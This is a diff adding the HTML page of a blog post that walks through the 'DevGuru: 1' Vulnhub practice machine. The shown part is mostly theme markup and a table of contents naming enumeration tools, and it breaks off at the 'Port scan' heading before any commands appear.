@@ -1,0 +1,1660 @@
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+    <head>
+        <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.128.2">
+    <meta name="theme" content="Hinode 0.14.0">
+    
+
+
+
+
+
+    
+    
+<link rel="stylesheet" href="/css/main.min.efe232a6d505bfd4eebc021116f402279b8f9434777650f9bc099c4caff52542.css" integrity="sha256-7+IyptUFv9TuvAIRFvQCJ5uPlDR3dlD5vAmcTK/1JUI=" crossorigin="anonymous">
+    
+        
+    
+    
+         
+        <link rel="preload" href="/fonts/inter-v12-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+
+
+
+
+  <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <title>Hinode - DevGuru: 1 - Vulnhub </title>
+    <meta name="description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.
+...">
+
+<link rel="canonical" href="https://example.com/blog/devguru1_vulnhub/">
+
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DevGuru: 1 - Vulnhub ">
+<meta property="og:description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.
+...">
+<meta property="og:url" content="https://example.com/blog/devguru1_vulnhub/">
+<meta property="og:site_name" content="Hinode">
+<meta property="article:published_time" content="2020-12-15T08:40:51-03:00">
+    <meta property="article:modified_time" content="2020-12-15T08:40:51-03:00">
+    <meta property="og:image" content="https://example.com/logo.png">
+<meta property="og:image:alt" content="DevGuru: 1 - Vulnhub ">
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+
+
+<meta name="twitter:title" content="DevGuru: 1 - Vulnhub ">
+<meta name="twitter:description" content="DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.
+...">
+<meta name="twitter:image" content="https://example.com/logo.png">
+<meta name="twitter:image:alt" content="DevGuru: 1 - Vulnhub ">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Organization",
+        "@id": "https://example.com/#/schema/organization/1",
+      "name": "Hinode",
+      "url": "https://example.com/",
+      "sameAs": [
+        , "https://github.com/gethinode/hinode"
+        ],
+      "image": {
+          "@type": "ImageObject",
+          "@id": "https://example.com/#/schema/image/1",
+          "url": "https://example.com/\u003cnil\u003e",
+          "width": null ,
+          "height": null ,
+          "caption": "Hinode"
+        }
+      },
+    {
+      "@type": "WebSite",
+      "@id": "https://example.com/#/schema/website/1",
+      "url": "https://example.com/",
+      "name": "Hinode",
+      "description": "Hinode is a clean documentation and blog theme for your Hugo site based on Bootstrap 5.",
+      "publisher": {
+          "@id": "https://example.com/#/schema/organization/1"
+        }
+      },
+    {
+      "@type": "WebPage",
+      "@id": "https://example.com/blog/devguru1_vulnhub/",
+      "url": "https://example.com/blog/devguru1_vulnhub/",
+      "name": "DevGuru: 1 - Vulnhub ",
+      "description": "",
+      "isPartOf": {
+        "@id": "https://example.com/#/schema/website/1"
+      },
+      "about": {
+          "@id": "https://example.com/#/schema/organization/1"
+        },
+      "datePublished": "2020-12-15T08:40:51CET",
+      "dateModified": "2020-12-15T08:40:51CET",
+      "breadcrumb": {
+        "@id": "https://example.com/blog/devguru1_vulnhub/#/schema/breadcrumb/1"
+      },
+      "primaryImageOfPage": {
+        "@id": "https://example.com/blog/devguru1_vulnhub/#/schema/image/2"
+      },
+      "inLanguage": "en-US",
+      "potentialAction": [{
+        "@type": "ReadAction", "target": ["https://example.com/blog/devguru1_vulnhub/"]
+      }]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://example.com/blog/devguru1_vulnhub/#/schema/breadcrumb/1",
+      "name": "Breadcrumbs",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position":  1 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://example.com/",
+          "url": "https://example.com/",
+          "name": "Home"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://example.com/blog/",
+          "url": "https://example.com/blog/",
+          "name": "Blog"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "item": {
+          "@id": "https://example.com/blog/devguru1_vulnhub/"
+          }
+        }]
+    },
+
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "Article",
+          "@id": "https://example.com/#/schema/article/1",
+          "headline": "DevGuru: 1 - Vulnhub ",
+          "description": "",
+          "isPartOf": {
+            "@id": "https://example.com/blog/devguru1_vulnhub/"
+          },
+          "mainEntityOfPage": {
+            "@id": "https://example.com/blog/devguru1_vulnhub/"
+          },
+          "datePublished": "2020-12-15T08:40:51CET",
+          "dateModified": "2020-12-15T08:40:51CET",
+          "author": {
+            "@id": "https://example.com/#/schema/person/2"
+          },
+          "publisher": {
+              "@id": "https://example.com/#/schema/organization/1"
+            },
+          "image": {
+            "@id": "https://example.com/blog/devguru1_vulnhub/#/schema/image/2"
+          }
+        }
+      ]
+    },
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "Person",
+          "@id": "https://example.com/#/schema/person/2",
+          "name":  null ,
+          "sameAs": [
+            ]
+        }
+      ]
+    },
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "ImageObject",
+          "@id": "https://example.com/blog/devguru1_vulnhub/#/schema/image/2",
+          "url": "https://example.com/logo.png",
+          "contentUrl": "https://example.com/logo.png",
+          "caption": "DevGuru: 1 - Vulnhub "
+        }
+      ]
+    }
+
+  ]
+}
+</script>
+    <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_16x16_resize_catmullrom_3.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_32x32_resize_catmullrom_3.png">
+        <link rel="icon" type="image/png" sizes="48x48" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_48x48_resize_catmullrom_3.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="/img/favicon_hu29d17b5413868ec40c659bb26691088e_2409_180x0_resize_catmullrom_3.png">
+    
+
+</head>
+
+    <body>
+<script src="/js/critical.bundle.min.a73ed0b9da936bca55cd96a54840ab270bde232f86b9b2f7ca2026635b177982.js" integrity="sha256-pz7QudqTa8pVzZalSECrJwveIy&#43;GubL3yiAmY1sXeYI=" crossorigin="anonymous"></script>
+    <div class="d-flex flex-column min-vh-100">
+            <div class="d-flex flex-column ">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="container-fluid fixed-top p-0">
+
+
+
+
+
+
+<nav class="navbar p-4 bg-body navbar-fixed-top navbar-expand-md"
+        
+        
+        >
+        <div class="container-xxl p-0">
+            <div class="d-flex navbar-container justify-content-center">
+                
+                <div class="d-flex align-items-center">
+                        <button class="navbar-toggler collapsed p-0 mx-auto invisible fw-30" type="button">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-ellipsis fa-fw"></i> --><svg class="svg-inline--fa fas fa-ellipsis fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M8 256a56 56 0 1 1 112 0A56 56 0 1 1 8 256zm160 0a56 56 0 1 1 112 0 56 56 0 1 1 -112 0zm216-56a56 56 0 1 1 0 112 56 56 0 1 1 0-112z"/></svg>
+
+    
+</button></div>
+        
+                
+                <div class="mx-auto">
+                    <a class="navbar-brand" href="/" aria-label="Home">
+                            <img src="/img/tt-logo-icon.svg" alt="Hinode logo" height="30"></a>
+                </div>
+        
+                
+                <div class="d-flex align-items-center">
+                    <button class="navbar-toggler main-nav-toggler collapsed p-0" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-0-collapse"
+                        aria-controls="navbar-0" aria-expanded="false" aria-label="Toggle main navigation">
+                        <span class="toggler-icon top-bar emphasis"></span>
+                        <span class="toggler-icon middle-bar emphasis"></span>
+                        <span class="toggler-icon bottom-bar emphasis"></span>
+                    </button>
+                </div>
+            </div>
+    
+            <div class="navbar-collapse collapse" id="navbar-0-collapse">
+                <div class="d-flex flex-fill ms-md-3">
+    <form class="search flex-fill position-relative me-auto">
+        <input class="search-input form-control is-search" type="search" placeholder="Search this site" aria-label="Search this site" autocomplete="off">
+        <div class="search-suggestions shadow bg-body rounded d-none" data-no-results="No results for"></div>
+    </form>
+</div>
+
+                <ul class="navbar-nav ms-auto">
+                            <li class="nav-item ">
+
+
+
+
+
+
+
+
+    
+        <a class="nav-link" 
+            
+            data-nav="main" data-nav-main="home" 
+            href="/" ><span >Home</span>&nbsp;</a>
+    
+</li>
+                            <li class="nav-item ">
+
+
+
+
+
+
+
+
+    
+        <a class="nav-link" 
+            
+            data-nav="main" data-nav-main="tags" 
+            href="/tags" ><span >Tags</span>&nbsp;</a>
+    
+</li><div class="d-flex mode-switch align-items-center" id="navbar-mode">
+        <input type="checkbox" class="checkbox navbar-mode-selector" id="navbar-mode-checkbox" />
+        <label class="label" for="navbar-mode-checkbox">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-sun fa-fw"></i> --><svg class="svg-inline--fa fas fa-sun fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M361.5 1.2c5 2.1 8.6 6.6 9.6 11.9L391 121l107.9 19.8c5.3 1 9.8 4.6 11.9 9.6s1.5 10.7-1.6 15.2L446.9 256l62.3 90.3c3.1 4.5 3.7 10.2 1.6 15.2s-6.6 8.6-11.9 9.6L391 391 371.1 498.9c-1 5.3-4.6 9.8-9.6 11.9s-10.7 1.5-15.2-1.6L256 446.9l-90.3 62.3c-4.5 3.1-10.2 3.7-15.2 1.6s-8.6-6.6-9.6-11.9L121 391 13.1 371.1c-5.3-1-9.8-4.6-11.9-9.6s-1.5-10.7 1.6-15.2L65.1 256 2.8 165.7c-3.1-4.5-3.7-10.2-1.6-15.2s6.6-8.6 11.9-9.6L121 121 140.9 13.1c1-5.3 4.6-9.8 9.6-11.9s10.7-1.5 15.2 1.6L256 65.1 346.3 2.8c4.5-3.1 10.2-3.7 15.2-1.6zM160 256a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zm224 0a128 128 0 1 0 -256 0 128 128 0 1 0 256 0z"/></svg>
+
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-moon fa-fw"></i> --><svg class="svg-inline--fa fas fa-moon fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 384 512"><path d="M223.5 32C100 32 0 132.3 0 256S100 480 223.5 480c60.6 0 115.5-24.2 155.8-63.4c5-4.9 6.3-12.5 3.1-18.7s-10.1-9.7-17-8.5c-9.8 1.7-19.8 2.6-30.1 2.6c-96.9 0-175.5-78.8-175.5-176c0-65.8 36-123.1 89.3-153.3c6.1-3.5 9.2-10.5 7.7-17.3s-7.3-11.9-14.3-12.5c-6.3-.5-12.6-.8-19-.8z"/></svg>
+
+    
+
+            <div class="ball"></div>
+        </label>
+    </div></ul>
+            </div>
+        </div>
+    </nav>
+</div>
+
+<div class="main-content">
+                    </div>
+                
+            </div>
+
+            
+                
+    
+
+    
+        <div class="offcanvas offcanvas-start" tabindex="-1" id="offcanvass-sidebar" aria-inledby="offcanvas-label">
+            <div class="offcanvas-header">
+                <h5 class="offcanvas-title" id="offcanvas-label">Blog</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+            </div>
+            <div class="offcanvas-body">
+                
+
+            </div>
+        </div>
+    
+
+    <div class="container-xxl flex-fill p-4 px-xxl-0">
+        <div class="row row-cols-1 row-cols-md-2 row-cols-lg-3">
+                <div class="col col-lg-2 d-none d-lg-block sidebar-overflow sticky-top pt-5">
+                    
+
+                </div>
+                <div class="col-12 col-md-9 col-lg-8 mb-5 p-4">
+                    
+
+
+
+
+
+
+
+
+
+
+
+    <nav aria-label="breadcrumb">
+        <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="/">Home</a></li>
+                
+                    <li class="breadcrumb-item"><a href="/blog/">Blogs</a></li>
+                <li class="breadcrumb-item active" aria-current="page">DevGuru: 1 - Vulnhub </li>
+        </ol>
+    </nav>
+<p class="display-4 mt-5">DevGuru: 1 - Vulnhub </p>
+
+    <small class="text-body-secondary text-uppercase">
+        Posted on December 15, 2020
+            
+        
+        &bull;
+        10&nbsp;min read &bull;
+        2,114&nbsp;words
+    </small>
+<div class="mt-3">
+        <div class="d-none-dark">
+            <div class="hstack gap-1">
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Vulnhub"
+        href="/tags/vulnhub/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Vulnhub</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Hacking"
+        href="/tags/hacking/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Hacking</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Ctf"
+        href="/tags/ctf/" class="btn btn-light btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Ctf</div>
+        </div></a>&nbsp;
+
+                </div>
+        </div>
+        
+        <div class="d-none-light">
+            <div class="hstack gap-1">
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Vulnhub"
+        href="/tags/vulnhub/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Vulnhub</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Hacking"
+        href="/tags/hacking/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Hacking</div>
+        </div></a>&nbsp;
+
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Ctf"
+        href="/tags/ctf/" class="btn btn-outline-primary btn-sm position-relative  "
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto">Ctf</div>
+        </div></a>&nbsp;
+
+                </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+<div class="py-3 text-body-secondary hstack gap-1">
+            Share via 
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via LinkedIn"
+        href="https://www.linkedin.com/sharing/share-offsite/?url=https://example.com/blog/devguru1_vulnhub/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-linkedin fa-fw"></i> --><svg class="svg-inline--fa fab fa-linkedin fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via Twitter"
+        href="https://twitter.com/home?status=https://example.com/blog/devguru1_vulnhub/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-x-twitter fa-fw"></i> --><svg class="svg-inline--fa fab fa-x-twitter fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via Facebook"
+        href="https://www.facebook.com/sharer.php?u=https://example.com/blog/devguru1_vulnhub/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-facebook fa-fw"></i> --><svg class="svg-inline--fa fab fa-facebook fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 512 512"><path d="M512 256C512 114.6 397.4 0 256 0S0 114.6 0 256C0 376 82.7 476.8 194.2 504.5V334.2H141.4V256h52.8V222.3c0-87.1 39.4-127.5 125-127.5c16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1c-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H287V510.1C413.8 494.8 512 386.9 512 256h0z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+
+
+
+    <a aria-label="Share via WhatsApp"
+        href="whatsapp://send?text=DevGuru%3A&#43;1&#43;-&#43;Vulnhub&#43;%20https://example.com/blog/devguru1_vulnhub/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fab fa-whatsapp fa-fw"></i> --><svg class="svg-inline--fa fab fa-whatsapp fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+    
+</div>
+        </div></a>
+
+
+
+
+
+
+
+
+<div id="toast-message-email-4" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-header">
+        <strong class="me-auto">Hinode</strong>
+        <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
+    </div>
+    <div class="toast-body">Link copied to clipboard</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via email"
+        href="#!" data-toast-target="toast-message-email-4" data-clipboard="https://example.com/blog/devguru1_vulnhub/" class="btn btn-primary  position-relative  btn-social p-0"
+        role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link fa-fw"></i> --><svg class="svg-inline--fa fas fa-link fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    
+</div>
+        </div></a>
+
+                
+                
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="Share via system"
+        href="#!" id="btn-webshare" class="btn btn-primary  position-relative  btn-social p-0"
+         data-sharing-description="%!s(<nil>)" data-sharing-title="%!s(<nil>)" data-sharing-url="%!s(<nil>)"role="button"
+        >
+        <div class="d-flex justify-content-center">
+            <div class="my-auto"></div><div class="align-self-center">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-share-nodes fa-fw"></i> --><svg class="svg-inline--fa fas fa-share-nodes fa-fw" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 448 512"><path d="M352 224c53 0 96-43 96-96s-43-96-96-96s-96 43-96 96c0 4 .2 8 .7 11.9l-94.1 47C145.4 170.2 121.9 160 96 160c-53 0-96 43-96 96s43 96 96 96c25.9 0 49.4-10.2 66.6-26.9l94.1 47c-.5 3.9-.7 7.8-.7 11.9c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-25.9 0-49.4 10.2-66.6 26.9l-94.1-47c.5-3.9 .7-7.8 .7-11.9s-.2-8-.7-11.9l94.1-47C302.6 213.8 326.1 224 352 224z"/></svg>
+
+    
+</div>
+        </div></a>
+</div>
+<p class="lead mb-5 mt-3"></p>
+<div class="d-md-none pb-5">
+
+
+
+
+
+
+<div class="d-grid gap-2 mx-auto">
+        
+
+
+
+
+
+
+
+
+
+    
+
+    <a aria-label="On this page"
+        href="#toc-collapse" class="btn btn-outline-secondary  position-relative  toc-button"
+         data-bs-toggle="collapse" aria-expanded="false" aria-controls="toc-collapse"role="button"
+        >
+        <div class="d-flex justify-content-between">
+            <div class="my-auto">On this page</div><div class="align-self-center ps-1">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-sort "></i> --><svg class="svg-inline--fa fas fa-sort " fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 320 512"><path d="M137.4 41.4c12.5-12.5 32.8-12.5 45.3 0l128 128c9.2 9.2 11.9 22.9 6.9 34.9s-16.6 19.8-29.6 19.8H32c-12.9 0-24.6-7.8-29.6-19.8s-2.2-25.7 6.9-34.9l128-128zm0 429.3l-128-128c-9.2-9.2-11.9-22.9-6.9-34.9s16.6-19.8 29.6-19.8H288c12.9 0 24.6 7.8 29.6 19.8s2.2 25.7-6.9 34.9l-128 128c-12.5 12.5-32.8 12.5-45.3 0z"/></svg>
+
+    
+</div>
+        </div></a>
+</div>
+
+    <div class="collapse border bg-body-tertiary rounded p-1 navbar-nav-scroll" id="toc-collapse">
+        <div class="toc toc-panel text-body p-2">
+            <small><nav id="TableOfContents">
+  <ul>
+    <li><a href="#port-scan">Port scan</a></li>
+    <li><a href="#web-discovery">Web discovery</a>
+      <ul>
+        <li><a href="#nikto">Nikto</a></li>
+        <li><a href="#ffuf">ffuf</a></li>
+        <li><a href="#nuclei">Nuclei</a></li>
+        <li><a href="#git-dumper">Git-dumper</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></small>
+        </div>
+    </div>
+</div>
+<p>DevGuru: 1 - A Vulnhub vulnerable machine walkthrough.</p>
+<!-- raw HTML omitted -->
+
+<h1 id="table-of-contents" class="heading">Table of contents <a href="#table-of-contents" aria-labelledby="table-of-contents">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+<ul>
+<li><a href="/blog/devguru1_vulnhub/#-enumeration">🔎 Enumeration</a></li>
+<li><a href="/blog/devguru1_vulnhub/#-foothold">🚪🚶 Foothold</a></li>
+<li><a href="/blog/devguru1_vulnhub/#-privilege-escalation">🛡️ Privilege Escalation</a></li>
+<li><a href="/blog/devguru1_vulnhub/#-complete">🍻 Complete</a></li>
+</ul>
+
+<h1 id="-enumeration" class="heading">🔎 Enumeration <a href="#-enumeration" aria-labelledby="-enumeration">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h1>
+
+<h2 id="port-scan" class="heading">Port scan <a href="#port-scan" aria-labelledby="port-scan">
+
+
+
+
+
+
+
+
+
+    
+
